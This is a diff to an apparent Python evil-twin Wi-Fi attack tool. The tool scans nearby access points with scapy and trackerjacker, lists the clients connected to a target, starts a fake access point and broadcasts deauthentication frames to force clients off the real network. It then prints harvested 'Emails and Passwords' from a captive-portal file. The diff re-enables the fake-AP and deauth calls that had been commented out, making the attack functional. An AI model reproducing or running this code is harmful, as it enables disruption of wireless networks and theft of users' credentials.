@@ -1,11 +1,9 @@
 import ifcfg
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
-from scapy.layers.l2 import ARP, Ether
-from wifi import Cell, Scheme
+from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
+from wifi import Cell
 from scapy.all import *
 import yaml
-import datetime
-import io
+
 
 
 def chooseDevice():
@@ -57,7 +55,7 @@ def checkFotRoot():
 
 
 def apRescanHandler(interface):
-    print("\n\n\n=================\nScanned APs\n=================")
+    print("\n\n\n===============\nScanned APs\n===============")
     devices = (list(printAP(interface)))
     attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
     while attSsid == "R" or attSsid == "r":
@@ -87,6 +85,7 @@ def stopAttack():
     print("Stopping attack..")
     os.system("sudo bash fake-ap-stop.sh")
     f = open("/srv/http/passwords.txt")
+    print("\n\n======================\nEmails and Passwords\n======================")
     print(f.read())
 
 
@@ -139,21 +138,26 @@ def printDevices(ssid):
     print("\033[91mAP ssid: " + apSsid + "\nAP bssid: " + ap.bssid)
     print("Connected divices list:\n")
     print("\033[94mSSID                  SIGNAL    VENDOR")
+    counter = 1
     for device in ap.connectedDevices:
-        print(device.bssid + "     " + str(device.signal) + "       " + device.vendor)
+        print(str(counter) + '. ' + device.bssid + "     " + str(device.signal) + "       " + device.vendor)
+        counter += 1
     os.system("rm wifi_map.yaml")
     print("\n\n\n")
     return ap
+
+
+
+
 if __name__ == "__main__":
     checkFotRoot()
     apDevice = chooseDevice()
     ap = apRescanHandler(apDevice)
     ssid = ap[0]
     addr = ap[1]
-    # startAP(ssid, apDevice)
-    os.system("rm wifi_map.yaml")
+    startAP(ssid, apDevice)
     os.system('trackerjacker -i ' + apDevice + ' --map')
     printDevices(ssid)
     brdmac = "ff:ff:ff:ff:ff:ff"
-    # deauth(brdmac, addr)
+    deauth(brdmac, addr)
     stopAttack()
